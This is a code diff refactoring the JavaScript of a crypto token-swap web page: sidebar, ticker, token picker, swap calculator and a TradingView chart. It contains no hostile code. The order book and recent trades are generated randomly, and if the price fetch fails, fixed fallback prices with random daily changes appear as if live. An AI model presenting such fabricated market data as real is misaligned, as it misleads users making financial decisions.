-            'avalanche-2': 29,
-            'matic-network': 0.09,
-            chainlink: 14.2,
-            arbitrum: 0.95,
-            optimism: 1.82,
-            dogecoin: 0.16,
-          };
-          TOKENS.forEach((t) => {
-            if (fallback[t.id]) {
-              t.price = fallback[t.id];
-              t.change = (Math.random() - 0.4) * 8;
-            }
-          });
-          pricesLoaded = true;
-          renderSidebar();
-          renderTicker();
-          updateChart();
-          calcSwap();
+          TOKENS.forEach(t => { if(data[t.id]){ t.price=data[t.id].usd; t.change=data[t.id].usd_24h_change||0; } });
+        } catch(e) {
+          const fb={bitcoin:102000,ethereum:2450,binancecoin:620,solana:155,'avalanche-2':29,chainlink:14.2,arbitrum:0.95,optimism:1.82,dogecoin:0.16};
+          TOKENS.forEach(t=>{ if(fb[t.id]){t.price=fb[t.id];t.change=(Math.random()-0.4)*8;} });
         }
+        renderSidebar(); renderTicker(); calcSwap();
+        renderOrderBook(selectedToken.price); renderRecentTrades(selectedToken.price);
       }
-      // ─── RENDER SIDEBAR ───
-      
-      function renderSidebar() {
-  const el = document.getElementById('tokenList');
-  if (!el) return;
 
-  el.innerHTML = TOKENS.filter((t) => t.sym !== 'USDT')
-    .map((t) => {
-      const isSelected = t.sym === selectedToken.sym ? ' selected' : '';
-      
-      return `
-        <div class="token-row${isSelected}" onclick="window.selectToken('${t.sym}')">
-          <!-- Added style here to ensure it stays small -->
-          <img src="${t.icon}" class="token-icon-img" style="width:20px; height:20px;">
-          <div class="token-info">
-            <span class="token-sym">${t.sym}</span>
-            <span class="token-name">${t.name}</span>
+      // ═══ SIDEBAR ═══
+      function renderSidebar(filter) {
+        const el = document.getElementById('tokenList');
+        if (!el) return;
+        const q = (filter||'').toLowerCase();
+        const list = TOKENS.filter(t => t.sym !== 'USDT' && (!q || t.sym.toLowerCase().includes(q) || t.name.toLowerCase().includes(q)));
+        el.innerHTML = list.map(t => `
+          <div class="token-row${t.sym===selectedToken.sym?' selected':''}" onclick="selectTokenFromSidebar('${t.sym}')">
+            <img src="${t.icon}" style="width:20px;height:20px;border-radius:50%;flex-shrink:0;" onerror="this.style.display='none'">
+            <div class="token-info">
+              <span class="token-sym">${t.sym}</span>
+              <span class="token-name">${t.name}</span>
+            </div>
+            <div class="token-price-col">
+              <span class="token-price">${fmtPrice(t.price)}</span>
+              <span class="token-change ${t.change>=0?'pos':'neg'}">${t.change>=0?'+':''}${t.change.toFixed(2)}%</span>
+            </div>
           </div>
-          <div class="token-price-col">
-            <span class="token-price">${fmtPrice(t.price)}</span>
-            <span class="token-change ${t.change >= 0 ? 'pos' : 'neg'}">
-              ${t.change >= 0 ? '+' : ''}${t.change.toFixed(2)}%
-            </span>
-          </div>
-        </div>
-      `;
-    })
-    .join('');
-}
+        `).join('');
+      }
 
-      // ─── RENDER TICKER ───
+      function filterSidebar() {
+        renderSidebar(document.getElementById('sidebarSearch').value);
+      }
+
+      // ═══ TICKER ═══
       function renderTicker() {
-        const items = TOKENS.filter((t) => t.sym !== 'USDT')
-          .map(
-            (t) => `
-    <span class="ticker-item">
-      <span class="ticker-sym">${t.sym}</span>
-      <span>${fmtPrice(t.price)}</span>
-      <span class="${t.change >= 0 ? 'pos' : 'neg'}">${
-              t.change >= 0 ? '+' : ''
-            }${t.change.toFixed(2)}%</span>
-    </span>
-  `
-          )
-          .join('');
+        const items = TOKENS.filter(t=>t.sym!=='USDT').map(t=>`
+          <span class="ticker-item">
+            <span class="ticker-sym">${t.sym}</span>
+            <span>${fmtPrice(t.price)}</span>
+            <span class="${t.change>=0?'pos':'neg'}">${t.change>=0?'+':''}${t.change.toFixed(2)}%</span>
+          </span>`).join('');
         const inner = document.getElementById('tickerInner');
-        inner.innerHTML = items + items; // duplicate for seamless loop
+        inner.innerHTML = items + items;
       }
 
-      // ─── UPDATE CHART ───
-      async function updateChart() {
-        document.getElementById('chartPrice').textContent = fmtPrice(
-          selectedToken.price
-        );
-        const chg = selectedToken.change;
-        const chgEl = document.getElementById('chartChange');
-        chgEl.textContent = `${chg >= 0 ? '+' : ''}${chg.toFixed(2)}%`;
-        chgEl.className = `chart-change-big ${chg >= 0 ? 'pos' : 'neg'}`;
-
-        // title
-        document.getElementById('chartTitle').innerHTML = `
-    <span style="background:${
-      selectedToken.color
-    };color:#fff;border-radius:50%;width:36px;height:36px;
-    display:flex;align-items:center;justify-content:center;font-size:0.7rem;font-weight:700;">
-    ${selectedToken.sym.slice(0, 3)}</span>
-    ${selectedToken.sym} / USDT
-  `;
-
-        // market stats
-        const p = selectedToken.price;
-        document.getElementById('ms-price').textContent = fmtPrice(p);
-        document.getElementById('ms-high').textContent = fmtPrice(
-          p * (1 + Math.abs((chg / 100) * 0.6 + 0.01))
-        );
-        document.getElementById('ms-low').textContent = fmtPrice(
-          p * (1 - Math.abs((chg / 100) * 0.6 + 0.01))
-        );
-        const cap =
-          p *
-          (selectedToken.sym === 'BTC'
-            ? 19700000
-            : selectedToken.sym === 'ETH'
-            ? 120000000
-            : 500000000);
-        document.getElementById('ms-cap').textContent = '$' + fmtLarge(cap);
-        // order book & trades
-        renderOrderBook(p);
-        renderRecentTrades(p);
+      // ═══ SELECT TOKEN ═══
+      function selectTokenFromSidebar(sym) {
+        const tok = TOKENS.find(t=>t.sym===sym);
+        if (!tok) return;
+        selectedToken = tok;
+        setFromIcon(tok);
+        document.getElementById('fromSym').textContent = tok.sym;
+        if (tok.tvSymbol) updateTradingViewChart(tok.tvSymbol);
+        renderSidebar(document.getElementById('sidebarSearch').value);
+        calcSwap();
+        // close on mobile
+        if (isMobile()) closeSidebarMobile();
       }
 
-      // ─── DRAW CHART ───
-      function drawChart(prices) {
-        const W = 700,
-          H = 270,
-          PAD = 10;
-        const min = Math.min(...prices);
-        const max = Math.max(...prices);
-        const range = max - min || 1;
-        const pts = prices.map((v, i) => {
-          const x = PAD + (i / (prices.length - 1)) * (W - PAD * 2);
-          const y = H - PAD - ((v - min) / range) * (H - PAD * 2);
-          return `${x},${y}`;
-        });
-
-        // grid
-        let grid = '';
-        for (let i = 0; i <= 4; i++) {
-          const y = PAD + (i / 4) * (H - PAD * 2);
-          grid += `<line x1="${PAD}" y1="${y}" x2="${
-            W - PAD
-          }" y2="${y}" stroke="rgba(255,255,255,0.05)" stroke-width="1"/>`;
-          const v = max - (i / 4) * range;
-          grid += `<text x="${W - PAD - 2}" y="${
-            y - 3
-          }" class="chart-label" text-anchor="end">${fmtPrice(v)}</text>`;
-        }
-        document.getElementById('chartGrid').innerHTML = grid;
-
-        const linePath = 'M' + pts.join('L');
-        document.getElementById('chartLine').setAttribute('d', linePath);
-
-        const lastX =
-          PAD + ((prices.length - 1) / (prices.length - 1)) * (W - PAD * 2);
-        const lastY = H - PAD;
-        const areaPath = linePath + `L${lastX},${lastY}L${PAD},${lastY}Z`;
-        document.getElementById('chartArea').setAttribute('d', areaPath);
-      }
-
-      // ─── ORDER BOOK ───
-      function renderOrderBook(price) {
-        let asks = '',
-          bids = '';
-        for (let i = 5; i > 0; i--) {
-          const p = price * (1 + i * 0.0008 * (Math.random() * 0.5 + 0.75));
-          const amt = (Math.random() * 4 + 0.1).toFixed(4);
-          const total = (p * amt).toFixed(2);
-          const pct = Math.random() * 80 + 10;
-          asks += `<div class="ob-row ask">
-      <span class="ob-price">${fmtPrice(p)}</span>
-      <span style="color:var(--text)">${amt}</span>
-      <span>${total}</span>
-      <div class="ob-bar" style="width:${pct}%;"></div>
-    </div>`;
-        }
-        for (let i = 1; i <= 5; i++) {
-          const p = price * (1 - i * 0.0008 * (Math.random() * 0.5 + 0.75));
-          const amt = (Math.random() * 4 + 0.1).toFixed(4);
-          const total = (p * amt).toFixed(2);
-          const pct = Math.random() * 80 + 10;
-          bids += `<div class="ob-row bid">
-      <span class="ob-price">${fmtPrice(p)}</span>
-      <span style="color:var(--text)">${amt}</span>
-      <span>${total}</span>
-      <div class="ob-bar" style="width:${pct}%;right:0;"></div>
-    </div>`;
-        }
-        document.getElementById('obAsks').innerHTML = asks;
-        document.getElementById('obBids').innerHTML = bids;
-        document.getElementById('obSpread').textContent = fmtPrice(
-          price * 0.003
-        );
-      }
-
-      // ─── RECENT TRADES ───
-      function renderRecentTrades(price) {
-        let html = '';
-        const now = new Date();
-        for (let i = 0; i < 12; i++) {
-          const isBuy = Math.random() > 0.48;
-          const p = price * (1 + (Math.random() - 0.5) * 0.002);
-          const amt = (Math.random() * 2 + 0.01).toFixed(4);
-          const t = new Date(now - i * 13000);
-          const time =
-            t.getHours().toString().padStart(2, '0') +
-            ':' +
-            t.getMinutes().toString().padStart(2, '0') +
-            ':' +
-            t.getSeconds().toString().padStart(2, '0');
-          html += `<div class="rt-row">
-      <span class="${isBuy ? 'pos' : 'neg'}">${fmtPrice(p)}</span>
-      <span style="color:var(--text)">${amt}</span>
-      <span style="color:var(--text-dim)">${time}</span>
-      <span class="${isBuy ? 'pos' : 'neg'}">${isBuy ? 'Buy' : 'Sell'}</span>
-    </div>`;
-        }
-        document.getElementById('recentTradesList').innerHTML = html;
-      }
-
-      // ─── SELECT TOKEN ───
-      function pickToken(sym) {
-  // Find the selected token object from your TOKENS array
-  const tok = TOKENS.find((t) => t.sym === sym);
-  
-  if (modalTarget === 'from') {
-    // Logic for updating the "Source" token
-    selectedToken = tok;
-    document.getElementById('fromDot').style.background = tok.color;
-    document.getElementById('fromDot').textContent = tok.sym.slice(0, 4);
-    document.getElementById('fromSym').textContent = tok.sym;
-    
-    // Refresh the TradingView chart with the new symbol
-    updateTradingViewChart(tok.tvSymbol); 
-    
-    // Update general UI components
-    renderSidebar();
-    updateChart(); 
-  } else {
-    // Logic for updating the "Destination" token
-    toToken = tok;
-    document.getElementById('toDot').style.background = tok.color;
-    document.getElementById('toDot').textContent = tok.sym.slice(0, 4);
-    document.getElementById('toSym').textContent = tok.sym;
-  }
-
-  // Recalculate exchange rates and close the modal
-  calcSwap();
-  closeTokenModal();
-}    
-// RIGHT: Define it globally
-window.selectToken = function(sym) {
-  const tok = TOKENS.find((t) => t.sym === sym);
-  if (!tok) return;
-
-  selectedToken = tok;
-
-  const fromDot = document.getElementById('fromDot');
-  if (fromDot) {
-    // We update the HTML and explicitly clear any background color style
-    fromDot.style.background = 'transparent'; 
-    fromDot.innerHTML = `<img src="${tok.icon}" style="width:20px; height:20px; border-radius:50%;">`;
-  }
-  
-  document.getElementById('fromSym').textContent = tok.sym;
-
-  updateTradingViewChart(tok.tvSymbol);
-  renderSidebar();
-  calcSwap();
-};
-      // ─── SWAP LOGIC ───
+      // ═══ SWAP ═══
       function calcSwap() {
-        const fromAmt =
-          parseFloat(document.getElementById('fromAmt').value) || 0;
-        const fromP = selectedToken.sym === 'USDT' ? 1 : selectedToken.price;
-        const toP = toToken.sym === 'USDT' ? 1 : toToken.price;
-        if (!fromP || !toP) return;
-
-        const impact =
-          fromAmt > 0 ? Math.min(fromAmt * fromP * 0.00002, 3).toFixed(4) : 0;
-        const toAmt =
-          fromAmt > 0
-            ? (((fromAmt * fromP) / toP) * (1 - 0.003)).toFixed(6)
-            : '';
-
+        const fromAmt = parseFloat(document.getElementById('fromAmt').value)||0;
+        const fromP = selectedToken.price||1;
+        const toP   = toToken.price||1;
+        const toAmt = fromAmt>0 ? (fromAmt*fromP/toP*(1-0.003)).toFixed(6) : '';
         document.getElementById('toAmt').value = toAmt;
-        document.getElementById('fromUSD').textContent =
-          fromAmt > 0
-            ? `≈ $${(fromAmt * fromP).toLocaleString(undefined, {
-                maximumFractionDigits: 2,
-              })}`
-            : '≈ $0.00';
-        document.getElementById('toUSD').textContent = toAmt
-          ? `≈ $${(parseFloat(toAmt) * toP).toLocaleString(undefined, {
-              maximumFractionDigits: 2,
-            })}`
-          : '≈ $0.00';
-
-        document.getElementById('swapRate').textContent =
-          fromP && toP
-            ? `1 ${selectedToken.sym} = ${(fromP / toP).toFixed(6)} ${
-                toToken.sym
-              }`
-            : '—';
-        document.getElementById('priceImpact').textContent =
-          fromAmt > 0 ? `${impact}%` : '—';
-        document.getElementById('networkFee').textContent =
-          fromAmt > 0 ? '~$0.82' : '—';
-        document.getElementById('minReceived').textContent = toAmt
-          ? `${(parseFloat(toAmt) * 0.999).toFixed(6)} ${toToken.sym}`
-          : '—';
-        document.getElementById('swapRoute').textContent =
-          fromAmt > 0 ? `${selectedToken.sym} → ${toToken.sym}` : '—';
-      }
-
-      function updateSwapFrom() {
-        const fromDot = document.getElementById('fromDot');
-        const fromSym = document.getElementById('fromSym');
-        fromDot.style.background = selectedToken.color;
-        fromDot.textContent = selectedToken.sym.slice(0, 4);
-        fromSym.textContent = selectedToken.sym;
+        document.getElementById('fromUSD').textContent = fromAmt>0?`≈ $${(fromAmt*fromP).toLocaleString(undefined,{maximumFractionDigits:2})}`:'≈ $0.00';
+        document.getElementById('toUSD').textContent   = toAmt?`≈ $${(parseFloat(toAmt)*toP).toLocaleString(undefined,{maximumFractionDigits:2})}`:'≈ $0.00';
+        document.getElementById('swapRate').textContent     = `1 ${selectedToken.sym} = ${(fromP/toP).toFixed(6)} ${toToken.sym}`;
+        document.getElementById('priceImpact').textContent  = fromAmt>0?`${Math.min(fromAmt*fromP*0.00002,3).toFixed(4)}%`:'—';
+        document.getElementById('networkFee').textContent   = fromAmt>0?'~$0.82':'—';
+        document.getElementById('minReceived').textContent  = toAmt?`${(parseFloat(toAmt)*0.999).toFixed(6)} ${toToken.sym}`:'—';
+        document.getElementById('swapRoute').textContent    = fromAmt>0?`${selectedToken.sym} → ${toToken.sym}`:'—';
       }
 
       function flipTokens() {
+        // swap the token objects
         const tmp = selectedToken;
         selectedToken = toToken;
         toToken = tmp;
-
-        // update from
-        const fromDot = document.getElementById('fromDot');
-        fromDot.style.background = selectedToken.color;
-        fromDot.textContent = selectedToken.sym.slice(0, 4);
+        // re-render both icons and symbols — icons come from tok.icon, never go blank
+        setFromIcon(selectedToken);
+        setToIcon(toToken);
         document.getElementById('fromSym').textContent = selectedToken.sym;
-
-        // update to
-        const toDot = document.getElementById('toDot');
-        toDot.style.background = toToken.color;
-        toDot.textContent = toToken.sym.slice(0, 4);
-        document.getElementById('toSym').textContent = toToken.sym;
-
+        document.getElementById('toSym').textContent   = toToken.sym;
+        if (selectedToken.tvSymbol) updateTradingViewChart(selectedToken.tvSymbol);
+        renderSidebar(document.getElementById('sidebarSearch').value);
         calcSwap();
       }
 
-      function setMax() {
-        document.getElementById('fromAmt').value = '1.0';
-        calcSwap();
-      }
-
+      function setMax() { document.getElementById('fromAmt').value='1.0'; calcSwap(); }
       function executeSwap() {
         const amt = document.getElementById('fromAmt').value;
-        if (!amt || parseFloat(amt) <= 0) {
-          alert('Please enter an amount.');
-          return;
-        }
-        alert(
-          `Connect your wallet to execute this swap:\n${amt} ${
-            selectedToken.sym
-          } → ${document.getElementById('toAmt').value} ${toToken.sym}`
-        );
+        if(!amt||parseFloat(amt)<=0){alert('Please enter an amount.');return;}
+        alert(`Connect your wallet to execute:\n${amt} ${selectedToken.sym} → ${document.getElementById('toAmt').value} ${toToken.sym}`);
       }
 
-      // ─── TOKEN MODAL ───
-      function filtermodaltokens() {
-    // 1. Get the input value (lowercase for case-insensitive search)
-    const input = document.getElementById('modaltokensearch');
-    const filter = input.value.toLowerCase();
-    
-    // 2. Target the container that holds your modal tokens
-    // IMPORTANT: Ensure the div holding your token list has id="modalTokenList"
-    const container = document.getElementById('modalTokenList'); 
-    
-    if (!container) return; // Prevents errors if the container isn't found
+      // ═══ ORDER BOOK ═══
+      function renderOrderBook(price) {
+        if(!price) return;
+        let asks='',bids='';
+        for(let i=5;i>0;i--){
+          const p=price*(1+i*0.0008*(Math.random()*0.5+0.75)),amt=(Math.random()*4+0.1).toFixed(4),total=(p*amt).toFixed(2),pct=Math.random()*80+10;
+          asks+=`<div class="ob-row ask"><span class="ob-price">${fmtPrice(p)}</span><span style="color:var(--text)">${amt}</span><span>${total}</span><div class="ob-bar" style="width:${pct}%"></div></div>`;
+        }
+        for(let i=1;i<=5;i++){
+          const p=price*(1-i*0.0008*(Math.random()*0.5+0.75)),amt=(Math.random()*4+0.1).toFixed(4),total=(p*amt).toFixed(2),pct=Math.random()*80+10;
+          bids+=`<div class="ob-row bid"><span class="ob-price">${fmtPrice(p)}</span><span style="color:var(--text)">${amt}</span><span>${total}</span><div class="ob-bar" style="width:${pct}%;right:0"></div></div>`;
+        }
+        document.getElementById('obAsks').innerHTML=asks;
+        document.getElementById('obBids').innerHTML=bids;
+        document.getElementById('obSpread').textContent=fmtPrice(price*0.003);
+      }
 
-    // 3. Get the rows (ensure your JS adds the 'token-row' class to each item)
-    const rows = container.getElementsByClassName('token-row');
+      function renderRecentTrades(price) {
+        if(!price) return;
+        let html=''; const now=new Date();
+        for(let i=0;i<12;i++){
+          const isBuy=Math.random()>0.48,p=price*(1+(Math.random()-0.5)*0.002),amt=(Math.random()*2+0.01).toFixed(4),t=new Date(now-i*13000);
+          const time=t.getHours().toString().padStart(2,'0')+':'+t.getMinutes().toString().padStart(2,'0')+':'+t.getSeconds().toString().padStart(2,'0');
+          html+=`<div class="rt-row"><span class="${isBuy?'pos':'neg'}">${fmtPrice(p)}</span><span style="color:var(--text)">${amt}</span><span style="color:var(--text-dim)">${time}</span><span class="${isBuy?'pos':'neg'}">${isBuy?'Buy':'Sell'}</span></div>`;
+        }
+        document.getElementById('recentTradesList').innerHTML=html;
+      }
 
-    for (let i = 0; i < rows.length; i++) {
-        const row = rows[i];
-        // Grab all text content inside the row (Symbol, Name, etc.)
-        const textContent = row.textContent || row.innerText;
-        
-        // 4. If the text matches the search, show it; otherwise, hide it
-        if (textContent.toLowerCase().includes(filter)) {
-            row.style.display = "flex"; // Matches your existing flex layout
+      // ═══ TOKEN MODAL ═══
+      function openTokenModal(target) {
+        modalTarget = target;
+        document.getElementById('tokenModal').style.display='flex';
+        document.getElementById('modaltokensearch').value='';
+        renderModalTokens(TOKENS);
+        setTimeout(()=>document.getElementById('modaltokensearch').focus(), 80);
+      }
+      function closeTokenModal() { document.getElementById('tokenModal').style.display='none'; }
+      function filterTokens() {
+        const q=document.getElementById('modaltokensearch').value.toLowerCase();
+        renderModalTokens(TOKENS.filter(t=>t.sym.toLowerCase().includes(q)||( t.name&&t.name.toLowerCase().includes(q))));
+      }
+      function renderModalTokens(list) {
+        const el=document.getElementById('modalTokenList');
+        if(!el) return;
+        el.innerHTML=list.map(t=>`
+          <div class="modal-token-row" onclick="pickToken('${t.sym}')">
+            <div style="display:flex;align-items:center;gap:12px;">
+              <img src="${t.icon}" style="width:28px;height:28px;border-radius:50%;object-fit:contain;" onerror="this.style.display='none'">
+              <div><div style="font-weight:700;color:#fff;">${t.sym}</div><div style="font-size:0.73rem;color:#888;">${t.name||''}</div></div>
+            </div>
+            <div style="text-align:right;font-family:var(--font-mono);font-size:0.8rem;color:#ccc;">${fmtPrice(t.price)}</div>
+          </div>`).join('');
+      }
+      function pickToken(sym) {
+        const tok=TOKENS.find(t=>t.sym===sym);
+        if(!tok) return;
+        if(modalTarget==='from'){
+          selectedToken=tok;
+          setFromIcon(tok);
+          document.getElementById('fromSym').textContent=tok.sym;
+          if(tok.tvSymbol) updateTradingViewChart(tok.tvSymbol);
+          renderSidebar(document.getElementById('sidebarSearch').value);
         } else {
-            row.style.display = "none";
+          toToken=tok;
+          setToIcon(tok);
+          document.getElementById('toSym').textContent=tok.sym;
         }
-    }
-}
+        calcSwap(); closeTokenModal();
+      }
+      document.getElementById('tokenModal').addEventListener('click',function(e){if(e.target===this)closeTokenModal();});
 
-    // ─── TOKEN MODAL ───
-// --- TOKEN MODAL LOGIC ---
+      // ═══ SIDEBAR TOGGLE ═══
+      function isMobile() { return window.innerWidth <= 900; }
 
-function openTokenModal(target) {
-  modalTarget = target;
-  document.getElementById('tokenModal').style.display = 'flex';
-  
-  // Clear the search box when opening
-  const searchInput = document.getElementById('modaltokensearch');
-  if (searchInput) searchInput.value = '';
-  
-  // Render full list initially
-  renderModalTokens(TOKENS); 
-  
-  // Auto-focus the search box
-  setTimeout(() => {
-    if (searchInput) searchInput.focus();
-  }, 100);
-}
-
-function closeTokenModal() {
-  document.getElementById('tokenModal').style.display = 'none';
-}
-
-function filterTokens() {
-  // 1. Get the current search text
-  const q = document.getElementById('modaltokensearch').value.toLowerCase();
-  
-  // 2. Filter the original TOKENS array
-  const filteredList = TOKENS.filter((t) =>
-    t.sym.toLowerCase().includes(q) || 
-    t.name.toLowerCase().includes(q)
-  );
-
-  // 3. Re-render the list with only matching tokens
-  renderModalTokens(filteredList);
-}
-
-// FIXED: Renamed to match the call above and added the 'list' parameter
-function renderModalTokens(list) {
-  const el = document.getElementById('modalTokenList'); 
-  if (!el) {
-    console.error("Modal list container not found!");
-    return;
-  }
-
-  // Use the 'list' passed in (either full TOKENS or filtered results)
-  el.innerHTML = list.map((t) => `
-    <div class="modal-token-row" onclick="pickToken('${t.sym}')" style="display: flex; align-items: center; justify-content: space-between; padding: 10px; cursor: pointer;">
-      <div style="display: flex; align-items: center;">
-        <!-- Fixed the size here -->
-        <img src="${t.icon}" style="width: 28px; height: 28px; border-radius: 50%; margin-right: 12px; object-fit: contain; background: transparent;">
-        <div style="display: flex; flex-direction: column;">
-          <span style="font-weight: 700; color: #fff;">${t.sym}</span>
-          <span style="font-size: 0.75rem; color: #888;">${t.name}</span>
-        </div>
-      </div>
-      <div style="color: #666; font-size: 0.85rem;">0.00</div>
-    </div>
-  `).join('');
-}
-
-function pickToken(sym) {
-  const tok = TOKENS.find((t) => t.sym === sym);
-  if (!tok) return;
-
-  if (modalTarget === 'from') {
-    selectedToken = tok;
-    
-    // Update the "From" side with the icon
-    const fromDot = document.getElementById('fromDot');
-    fromDot.style.background = 'transparent'; // Remove blue/old colors
-    fromDot.innerHTML = `<img src="${tok.icon}" style="width:20px; height:20px; border-radius:50%;">`;
-    
-    document.getElementById('fromSym').textContent = tok.sym;
-    
-    // Update the chart for the new selection
-    updateTradingViewChart(tok.tvSymbol);
-    renderSidebar();
-  } else {
-    toToken = tok;
-    
-    // Update the "To" side with the icon
-    const toDot = document.getElementById('toDot');
-    toDot.style.background = 'transparent';
-    toDot.innerHTML = `<img src="${tok.icon}" style="width:20px; height:20px; border-radius:50%;">`;
-    
-    document.getElementById('toSym').textContent = tok.sym;
-  }
-
-  calcSwap();
-  closeTokenModal();
-}
-      // ─── SLIPPAGE ───
-      function setSlip(btn, val) {
-        document
-          .querySelectorAll('.slip-btn')
-          .forEach((b) => b.classList.remove('active'));
-        btn.classList.add('active');
-        document.getElementById('slipCustom').value = '';
+      function toggleSidebar() {
+        if (isMobile()) {
+          const sidebar  = document.getElementById('appSidebar');
+          const btn      = document.getElementById('sidebarToggle');
+          const backdrop = document.getElementById('sidebarBackdrop');
+          const isOpen   = sidebar.classList.toggle('mobile-open');
+          btn.classList.toggle('mobile-open', isOpen);
+          backdrop.classList.toggle('show', isOpen);
+        } else {
+          const sidebar = document.getElementById('appSidebar');
+          const btn     = document.getElementById('sidebarToggle');
+          const isCollapsed = sidebar.classList.toggle('collapsed');
+          btn.classList.toggle('collapsed', isCollapsed);
+          btn.style.left = isCollapsed ? '0px' : 'var(--sidebar-w)';
+        }
+      }
+      function closeSidebarMobile() {
+        document.getElementById('appSidebar').classList.remove('mobile-open');
+        document.getElementById('sidebarToggle').classList.remove('mobile-open');
+        document.getElementById('sidebarBackdrop').classList.remove('show');
       }
 
-      // ─── TABS ───
-      function setTab(btn, tab) {
-        document
-          .querySelectorAll('.app-nav-btn')
-          .forEach((b) => b.classList.remove('active'));
-        btn.classList.add('active');
-      }
-      function setSwapTab(btn, tab) {
-        document
-          .querySelectorAll('.swap-tab')
-          .forEach((b) => b.classList.remove('active'));
-        btn.classList.add('active');
-      }
-      function setTf(btn, tf) {
-        document
-          .querySelectorAll('.tf-btn')
-          .forEach((b) => b.classList.remove('active'));
-        btn.classList.add('active');
-        const daysMap = { '1H': 0.04, '4H': 0.17, '1D': 1, '1W': 7 };
-        const days = daysMap[tf] || 1;
-        fetchChartHistory(selectedToken.id, days).then((h) => {
-          chartHistory = h;
-          drawChart(h);
-        });
-      }
+      // ═══ TABS / SLIPPAGE ═══
+      function setSwapTab(btn) { document.querySelectorAll('.swap-tab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); }
+      function setSlip(btn)    { document.querySelectorAll('.slip-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); document.getElementById('slipCustom').value=''; }
 
-      // ─── LAUNCH / BACK ───
+      // ═══ LAUNCH / BACK ═══
       function launchApp() {
-        document.getElementById('landing').style.display = 'none';
+        document.getElementById('landing').style.display='none';
         document.getElementById('app').classList.add('visible');
+        // init icons for default pair
+        setFromIcon(selectedToken);
+        setToIcon(toToken);
         fetchPrices();
-        // auto-refresh every 60s
         setInterval(fetchPrices, 60000);
-        // refresh order book every 5s
-        setInterval(() => {
-          if (selectedToken.price) {
-            renderOrderBook(selectedToken.price);
-            renderRecentTrades(selectedToken.price);
-          }
-        }, 5000);
+        setInterval(()=>{ if(selectedToken.price){renderOrderBook(selectedToken.price);renderRecentTrades(selectedToken.price);} }, 5000);
       }
+      function backToLanding() { document.getElementById('app').classList.remove('visible'); document.getElementById('landing').style.display='flex'; }
 
-      function backToLanding() {
-        document.getElementById('app').classList.remove('visible');
-        document.getElementById('landing').style.display = 'flex';
-      }
-
-      // ─── FORMAT HELPERS ───
-      function fmtPrice(n) {
-        if (!n || isNaN(n)) return '$0.00';
-        if (n >= 1000)
-          return (
-            '$' + n.toLocaleString(undefined, { maximumFractionDigits: 2 })
-          );
-        if (n >= 1) return '$' + n.toFixed(4);
-        return '$' + n.toFixed(6);
-      }
-      function fmtLarge(n) {
-        if (n >= 1e12) return (n / 1e12).toFixed(2) + 'T';
-        if (n >= 1e9) return (n / 1e9).toFixed(2) + 'B';
-        if (n >= 1e6) return (n / 1e6).toFixed(2) + 'M';
-        return n.toFixed(0);
-      }
-
-      // close modal on backdrop click
-      document
-        .getElementById('tokenModal')
-        .addEventListener('click', function (e) {
-          if (e.target === this) closeTokenModal();
-        });
-// ─── SIDEBAR TOGGLE ───
-function toggleSidebar() {
-  const sidebar = document.getElementById('appSidebar');
-  const btn     = document.getElementById('sidebarToggle');
-  const isCollapsed = sidebar.classList.toggle('collapsed');
-  btn.classList.toggle('collapsed', isCollapsed);
-  // Shift the button left when sidebar is hidden (left: 0), right when open (left: 260px)
-  btn.style.left = isCollapsed ? '0px' : '260px';
-}
-      // init fallback chart (before launch)
-      chartHistory = generateFakeHistory(2450);
+      // ═══ HELPERS ═══
+      function fmtPrice(n) { if(!n||isNaN(n)) return '$0.00'; if(n>=1000) return '$'+n.toLocaleString(undefined,{maximumFractionDigits:2}); if(n>=1) return '$'+n.toFixed(4); return '$'+n.toFixed(6); }
+      function fmtLarge(n) { if(n>=1e12) return (n/1e12).toFixed(2)+'T'; if(n>=1e9) return (n/1e9).toFixed(2)+'B'; if(n>=1e6) return (n/1e6).toFixed(2)+'M'; return n.toFixed(0); }
     </script>
-    <!-- 1. External TradingView Library -->
+
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
-    
-    <!-- 2. Your External chart.js file -->
     <script src="chart.js"></script>
-
     <script>
-        // 3. Initialize the chart
-        window.addEventListener('DOMContentLoaded', () => {
-            // Check if function exists to avoid errors
-            if (typeof initTradingViewChart === 'function') {
-                initTradingViewChart('tradingview_dex_chart');
-            }
+      window.addEventListener('DOMContentLoaded', () => {
+        if (typeof initTradingViewChart === 'function') initTradingViewChart('tradingview_dex_chart');
+      });
+      function updateTradingViewChart(symbol) {
+        const container = document.getElementById('tradingview_dex_chart');
+        if (!container) return;
+        container.innerHTML = '';
+        new TradingView.widget({
+          autosize: true, symbol: symbol, interval: 'H',
+          timezone: 'Etc/UTC', theme: 'dark', style: '1', locale: 'en',
+          toolbar_bg: '#111712', enable_publishing: false,
+          hide_side_toolbar: false, allow_symbol_change: true,
+          container_id: 'tradingview_dex_chart'
         });
-        function updateTradingViewChart(symbol) {
-  const container = document.getElementById('tradingview_dex_chart');
-  if (!container) return;
-
-  // Clear the old iframe/chart
-  container.innerHTML = ''; 
-
-  // Initialize a new widget
-  new TradingView.widget({
-    "autosize": true,
-    "symbol": symbol, // This is the dynamic part
-    "interval": "H",
-    "timezone": "Etc/UTC",
-    "theme": "dark",
-    "style": "1",
-    "locale": "en",
-    "toolbar_bg": "#f1f3f6",
-    "enable_publishing": false,
-    "hide_side_toolbar": false,
-    "allow_symbol_change": true,
-    "container_id": "tradingview_dex_chart"
-  });
-}
+      }
     </script>
-</body>
   </body>
 </html>
